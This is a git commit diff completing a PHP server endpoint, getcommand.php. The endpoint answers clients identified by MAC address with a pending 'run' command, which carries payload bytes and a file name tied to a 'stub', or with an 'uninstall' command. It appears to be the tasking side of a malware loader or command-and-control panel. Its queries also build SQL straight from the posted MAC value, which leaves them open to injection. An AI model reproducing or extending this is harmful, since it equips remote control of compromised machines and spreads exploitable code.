53a247b07e4ff48b651f64bf63c4a6640cf0579d
Xqruciator <choeving+1@protonmail.com>
2019-09-23 20:55:47 +0200

    Finished getcommand.php

--- Server/api/getcommand.php
+++ Server/api/getcommand.php
@@ -1,9 +1,27 @@
-
-
 <?php
 
 include('../database/db-config.php');
 include('../database/db-conn.php');
+
+function GetPayload($conn, $mac)
+{
+    $sql = "SELECT `payloads`.`PayloadBytes`,`payloads`.`FileName`,`payloads`.`Extension` FROM 
+    `clients`, `command`,`payloads` WHERE 
+    `clients`.`Id` = `command`.`Client_Id` AND 
+    `command`.`StubId` = `payloads`.`Id` AND 
+    `clients`.`MacAddr` = '$mac'";
+
+    $stmt = $conn->prepare($sql);
+
+    $stmt->execute();
+    
+    $result = $stmt->setFetchMode(PDO::FETCH_ASSOC);
+    if($result)
+    {
+        $payloads = $stmt->fetchAll();    
+        return $payloads;
+    }
+}
 
 function GetClientId($conn, $mac)
 {
@@ -21,11 +39,50 @@ function GetClientId($conn, $mac)
 
 function GetCommand($conn, $id)
 {
+    $sql = "SELECT `Command`, `StubId` FROM `command` WHERE `command`.`Client_Id` = " .$id;
+    $stmt = $conn->prepare($sql);
+    $stmt->execute();
     
+    $result = $stmt->setFetchMode(PDO::FETCH_ASSOC);
+    if($result)
+    {
+        $command = $stmt->fetchAll();    
+        return $command;
+    }
+    else
+    {
+        return null;
+    }
 }
 
 $mac = $_POST['mac'];
 $id = GetclientId($dbconn, $mac)[0]["Id"];
+$command = GetCommand($dbconn, $id);
+
+if($command == null)
+{
+    $commandarray = array('Message' => 'None');
+    echo(json_encode($commandarray));
+    die();
+}
+
+
+
+if($command[0]["Command"] == "run")
+{
+    $commandarray = array('Command' => 'run', 'Payload' => GetPayload($dbconn, $mac)[0] );
+
+    echo(json_encode($commandarray));
+    die();
+}
+else if($command[0]["Command"] == "uninstall")
+{
+    $commandarray = array('Command' => 'uninstall');
+
+    echo(json_encode($commandarray));
+    die();
+}
+
 
 
 
